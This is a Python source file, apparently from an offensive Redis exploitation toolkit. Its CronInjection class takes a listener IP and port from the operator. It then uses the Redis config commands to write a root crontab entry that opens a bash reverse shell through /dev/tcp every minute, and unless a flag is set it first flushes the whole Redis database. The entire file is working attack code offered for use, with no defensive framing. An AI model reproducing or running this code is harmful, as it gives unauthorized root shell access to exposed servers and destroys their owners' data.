from lib.Decorator import CatchPrivilegeException, CatchConnectionException, CatchKeyboardException


class CronInjection:
    @CatchKeyboardException
    def __init__(self, Controller):
        self.r = Controller.r
        self.host = Controller.options.url
        self.flush = Controller.options.flush
        self.ip = input("input your listen ip: ")
        self.port = input("input your listen port: ")
        self.cmd = "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/" + self.ip + "/" + self.port + " 0>&1\n\n"

        print("COMMAND: " + self.cmd.strip())
        print(f"SERVER {self.ip}:{self.port}")
        self.cronInject()

    @CatchPrivilegeException
    @CatchConnectionException
    def cronInject(self):
        if self.flush is not True:
            self.r.execute_command("flushall")
        print("[*]config setting")
        self.r.config_set("dir", "/var/spool/cron/")
        self.r.config_set("dbfilename", "root")
        self.r.set("xxx", self.cmd)
        print("[*]saving")
        self.r.save()
        print("[+]attack succeeded!")
